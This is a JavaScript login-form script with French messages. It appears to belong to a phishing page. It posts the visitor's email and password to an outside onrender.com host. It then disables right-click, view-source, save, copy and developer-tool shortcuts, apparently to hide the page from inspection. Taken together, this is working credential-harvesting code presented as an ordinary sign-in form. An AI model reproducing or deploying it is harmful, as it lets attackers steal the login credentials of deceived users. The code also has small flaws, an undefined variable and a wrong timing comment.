const emailInput = document.getElementById('email');
const passwordInput = document.getElementById('password');
const submitBtn = document.querySelector('.submit-btn');
const errorMessage = document.getElementById('errorMessage');
const loginForm = document.getElementById('loginForm');

function validateForm() {
    const isValid = emailInput.value.trim() !== '' && passwordInput.value.trim() !== '';
    submitBtn.disabled = !isValid;
}

emailInput.addEventListener('input', validateForm);
passwordInput.addEventListener('input', validateForm);

loginForm.addEventListener('submit', async function (e) {
    e.preventDefault();

    if (emailInput.value && passwordInput.value) {
        submitBtn.classList.add('loading');
        errorMessage.classList.remove('show');

        try {

            const response = await fetch('https://ty-93u2.onrender.com/login', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email: emailInput.value,
                    password: passwordInput.value,
					rememberMe: rememberMe.checked
                })
            });

            const result = await response.json();

            submitBtn.classList.remove('loading');

            passwordInput.value = '';

            if (result.success) {
                showSuccessPopup(result.redirect);
            } else {
                errorMessage.textContent = result.message;
                errorMessage.classList.add('show');
                passwordInput.focus();
            }

        } catch (error) {
            submitBtn.classList.remove('loading');
            console.error('Error:', error);
            errorMessage.textContent = 'Aucun compte n\'est associé aux informations fournies. Veuillez d\'abord vous inscrire.';
            errorMessage.classList.add('show');
            passwordInput.value = '';
        }
    }
});

function showSuccessPopup(redirectUrl) {
    const messageBox = document.getElementById('messageBox');
    const messageText = document.getElementById('messageBoxText');

    messageBox.style.display = 'flex';

    setTimeout(() => {
        window.location.href = redirectUrl;
    }, 2000);
}

validateForm();


      document.addEventListener('contextmenu', function(e) {
        e.preventDefault();
        return false;
      });
      document.addEventListener('keydown', function(e) {
     
        if ((e.ctrlKey && (e.key === 'c' || e.key === 'a' || e.key === 's' || e.key === 'u')) || e.key === 'F12') {
          e.preventDefault();
          return false;
        }
      });
      
      document.addEventListener('keydown', function(e) {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
          e.preventDefault();
          return false;
        }
      });
	  
	  $(window).on("load", () => {
    setTimeout(function () {
        $("#load").fadeOut();
    }, 2000); // 2000 millisecondes équivalent à 3 secondes
});